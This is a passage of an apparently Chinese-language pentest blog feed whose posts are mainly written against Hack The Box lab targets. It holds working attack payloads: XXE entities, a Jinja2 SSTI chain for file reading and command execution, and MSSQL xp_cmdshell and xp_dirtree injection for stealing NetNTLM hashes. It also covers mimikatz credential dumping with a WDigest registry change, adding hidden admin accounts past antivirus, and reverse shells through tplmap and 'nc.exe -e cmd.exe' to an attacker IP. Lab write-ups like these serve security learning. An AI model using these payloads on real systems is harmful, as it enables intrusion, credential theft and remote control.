expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>0x05、使用递归实体扩展进行DOS攻击</strong></p><h1 id="0x06、XXE漏洞挖掘："><a href="#0x06、XXE漏洞挖掘：" class="headerlink" title="0x06、XXE漏洞挖掘："></a>0x06、XXE漏洞挖掘：</h1><p> 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞</p><p>比如这个案例：<a href="https://www.freebuf.com/vuls/167087.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/167087.html</a> ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值</p><pre><code>POST /action HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 7foo=bar</code></pre><p>等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）</p><pre><code>POST /action HTTP/1.0Content-Type: text/xmlContent-Length: 52&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</code></pre><p><strong>1.文件上传XXE</strong>（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）</p><p><strong>2.传输内容XXE</strong> （支持XML）</p><p><strong>扩展之Json端点上的XXE</strong>：</p><p>原始JSON</p><pre><code>{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}</code></pre><p>XML转换(需要添加一个根元素，不然会成为无效的XML文档)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;</code></pre><p>以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）</p><p><img src="6.png" alt=""></p><p>成功验证XXE</p><p><img src="7.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01、XXE原理：&quot;&gt;&lt;a href=&quot;#0x01、XXE原理：&quot; class=&quot;headerlink&quot; title=&quot;0x01、XXE原理：&quot;&gt;&lt;/a&gt;0x01、XXE原理：&lt;/h1&gt;&lt;p&gt;XXE：XML External Entity Injection；
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>调用API绕过杀软添加用户</title>
    <link href="https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"/>
    <id>https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/</id>
    <published>2020-04-26T10:15:40.000Z</published>
    <updated>2020-04-26T10:32:15.700Z</updated>
    
    <content type="html"><![CDATA[<p><strong>创建隐藏账户：</strong></p><pre><code>net user tw$ password /add  ###用户名为tw，密码为password的也可以通过修改注册表实现，需要system权限    </code></pre><p><strong>如何发现隐藏账户：</strong></p><p>通过组查看：</p><pre><code>net localgroup administrators net localgroup users</code></pre><p>直接查看注册表，有什么用户一目了然<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</p><p>一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过</p><p><strong>实现：</strong></p><p>微软提供<a href="https://docs.microsoft.com/en-us/windows/win32/netmgmt/creating-a-local-group-and-adding-a-user" target="_blank" rel="noopener">C++实现</a>原型：</p><pre><code>#ifndef UNICODE#define UNICODE#endif#pragma comment(lib, &quot;netapi32.lib&quot;)#include &lt;stdio.h&gt;#include &lt;assert.h&gt;#include &lt;windows.h&gt; #include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[]){   LPGROUP_USERS_INFO_0 pBuf = NULL;   DWORD dwLevel = 0;   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;   DWORD dwEntriesRead = 0;   DWORD dwTotalEntries = 0;   NET_API_STATUS nStatus;   if (argc != 3)   {  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);  exit(1);   }   nStatus = NetUserGetGroups(argv[1],  argv[2],  dwLevel,  (LPBYTE*)&amp;pBuf,  dwPrefMaxLen,  &amp;dwEntriesRead,  &amp;dwTotalEntries);   if (nStatus == NERR_Success)   {  LPGROUP_USERS_INFO_0 pTmpBuf;  DWORD i;  DWORD dwTotalCount = 0;  if ((pTmpBuf = pBuf) != NULL)  { fprintf(stderr, &quot;\nGlobal group(s):\n&quot;); for (i = 0; i &lt; dwEntriesRead; i++) {assert(pTmpBuf != NULL);if (pTmpBuf == NULL){   fprintf(stderr, &quot;An access violation has occurred\n&quot;);   break;}wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);pTmpBuf++;dwTotalCount++; }  }  if (dwEntriesRead &lt; dwTotalEntries) fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);   }   else  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);   if (pBuf != NULL)  NetApiBufferFree(pBuf);   return 0;}</code></pre><p>NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组</p><p>我用C实现效果如下：<br><img src="1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;创建隐藏账户：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;st
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SSTI[服务器模板注入]</title>
    <link href="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2020-04-26T05:32:06.000Z</published>
    <updated>2020-04-26T05:40:46.401Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞成因：</strong></p><p>用户输入未经过滤就交给引擎处理</p><p><a href="http://www.onelinerizer.com/" target="_blank" rel="noopener">将python语句编译成一句话： </a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">不同类型SSTI paylaod: </a></p><p>SSTI模板注入常见引擎：</p><p><img src="1.png" alt=""></p><p>判断是哪种类型SSTI</p><p><img src="2.png" alt=""></p><p><strong>一个实例：</strong></p><p>nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI<br>返回输入内容，已知</p><p><img src="3.png" alt=""></p><p><strong>检测SSTI</strong></p><p><img src="4.png" alt=""></p><p>name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）</p><p>确定是jinja之后，尝试文件读取和命令执行</p><p><strong>读取文件</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code></pre><p><img src="5.png" alt=""></p><p><strong>命令执行：</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}{{ config.from_pyfile('/tmp/evilconfig.cfg') }}{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}</code></pre><p><a href="https://github.com/epinna/tplmap">SSTI注入工具tplmap</a>： </p><pre><code>python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;漏洞成因：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用户输入未经过滤就交给引擎处理&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.onelinerizer.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;将python语句编译成一句
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MSSQL NTLM stealer</title>
    <link href="https://github.com/2020/04/26/MSSQL-NTLM-stealer/"/>
    <id>https://github.com/2020/04/26/MSSQL-NTLM-stealer/</id>
    <published>2020-04-26T05:24:48.000Z</published>
    <updated>2020-04-26T05:31:15.481Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">可窃取NTLM的漏洞及利用方式</a></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。<br>利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。</p><p>如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希</p><h2 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a><strong>环境说明：</strong></h2><p><a href="https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL" target="_blank" rel="noopener">https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL</a> SQLi，发现高权限账户但无法读取密码</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="1.png" alt=""></p><p>默认情况ASP/MSSQL支持堆叠注入：</p><p>常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令</p><pre><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -</code></pre><p>本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -</code></pre><p>master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed</p><p>猜测是没有权限的问题，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">想到xp_dirtree外带数据</a>：</p><p>payload：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-</code></pre><p><img src="2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;可窃取NTLM的漏洞及利用
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>mimikatz抓取密码小记</title>
    <link href="https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"/>
    <id>https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/</id>
    <published>2020-04-26T05:22:42.000Z</published>
    <updated>2020-04-26T05:23:08.530Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1、直接抓取本机：</strong></p><p>[1]#privilege::debug          //提升权限<br>[2]#sekurlsa::logonpasswords  //抓取密码</p><p><strong>离线破解lsass.dmp</strong></p><p>[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来</p><p>[2]#privilege::debug          //提升权限</p><p>[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp</p><p>[4]#sekurlsa::logonpasswords  //抓取密码</p><p>踩坑点：</p><p>[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)<br>相对路径报错    </p><p>解决方法：lsass.dmp要给完整路径，</p><p>[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key import<br>mimikatz版本过低</p><p>解决方法：使用2.0版本</p><p>[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list</p><p>windows 2012之后明文抓取均会出现这个报错</p><p>需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了</p><p><strong>（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）</strong></p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;1、直接抓取本机：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[1]#privilege::debug          //提升权限&lt;br&gt;[2]#sekurlsa::logonpasswords  //抓取密码&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;离线破解lsass.d
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>内网使用smb无文件执行</title>
    <link href="https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"/>
    <id>https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/</id>
    <published>2020-04-26T05:04:38.000Z</published>
    <updated>2020-04-26T05:07:25.097Z</updated>
    
    <content type="html"><![CDATA[<p>创建smb共享</p><pre><code>mkdir smb &amp;&amp; cd smbcp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456</code></pre><p>测试：</p><pre><code>$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share</code></pre><p><img src="1.png" alt=""></p><p>执行：</p><pre><code>Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;创建smb共享&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir smb &amp;amp;&amp;amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2s
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shell中实现runas命令</title>
    <link href="https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/"/>
    <id>https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/</id>
    <published>2020-04-26T04:51:45.000Z</published>
    <updated>2020-04-26T04:52:03.244Z</updated>
    
    <content type="html"><![CDATA[<p>有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果</p><pre><code>$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     $cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $credInvoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$pass = conv
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
